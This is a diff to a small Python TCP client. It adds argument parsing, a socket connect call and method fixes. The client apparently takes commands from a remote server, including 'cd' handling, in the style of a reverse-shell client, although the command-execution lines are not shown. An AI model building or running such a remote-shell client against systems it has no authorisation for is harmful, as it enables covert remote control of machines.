@@ -2,6 +2,20 @@
 
 import socket as sock
 import os
+import sys
+
+if not len(sys.argv) == 3:
+    print('-' * 50)
+    print('[-] ERROR: Please enter a host and port number   |')
+    print('    USAGE: python ./tcp_server.py 127.0.0.1 4532 |')
+    print('-' * 50)
+    quit()
+else:
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    if port <= 1024:
+        print('You must enter a port number above 1024')
+        quit()
 
 class Client:
     def __init__(self, host, port):
@@ -11,8 +25,9 @@ class Client:
         self.cmd = ""
 
         self.socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
+        self.socket.connect((self.host, self.port))
 
-    def communicate_with_server():
+    def communicate_with_server(self):
         while True:
             self.data = self.socket.recv(65535)
             if self.data[:2].decode("utf-8") == "cd":
@@ -27,5 +42,11 @@ class Client:
 
         self.kill_connection()
 
-    def kill_connection():
+    def kill_connection(self):
         self.socket.close()
+
+def Main(_host, _port):
+    client = Client(_host, _port)
+
+if __name__ == '__main__':
+    Main(host,port)
